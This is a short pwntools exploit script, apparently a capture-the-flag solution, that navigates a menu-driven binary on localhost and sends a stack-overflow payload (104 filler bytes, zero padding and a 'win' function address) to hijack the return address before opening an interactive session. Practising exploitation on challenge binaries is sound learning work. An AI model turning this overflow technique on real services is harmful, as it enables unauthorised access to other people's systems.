#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template task
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'task')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)



io = remote("localhost", 37373)
# io = start()

win = 0x004029b0
pl=b'1'
io.sendlineafter(b'|(2) text file   |\n------------------\n', pl)
pl=b'1'
io.sendlineafter(b'Input number of objects\n',pl)
pl=b'a'*50
io.sendlineafter(b'length <= 50)\n', pl)
pl=b'x'*104+10*p64(0)+p64(win)
io.sendlineafter(b'<= 100)\n', pl)
pl=b'1'
io.sendlineafter(b'emphasis\n',pl)


io.interactive()

